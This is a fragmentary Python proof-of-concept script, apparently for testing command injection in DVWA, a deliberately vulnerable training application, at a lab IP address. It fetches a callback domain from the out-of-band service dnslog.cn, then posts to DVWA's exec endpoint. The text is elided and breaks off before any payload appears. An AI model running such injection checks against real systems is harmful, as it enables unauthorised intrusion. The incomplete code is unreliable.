...
"""
@Project  :dvwa-POC
@File     :dvwa-Command-Injection.py
@Date     :2022/5/9 16:27
@Author   :7-R2X
...
def get_dnslog_info():
    ...
    response = requests.get('http://www.dnslog.cn/getrecords.php', cookies=cookies, headers=headers, verify=False)
...
def get_dnslog_domain():
    ...
    response = requests.get('http://www.dnslog.cn/getdomain.php', cookies=cookies, headers=headers, verify=False)
    return response.text
...
def check_poc():
    ...
    try:
        response = requests.post('http://192.168.163.131:8080/vulnerabilities/exec/', cookies=cookies, headers=headers,
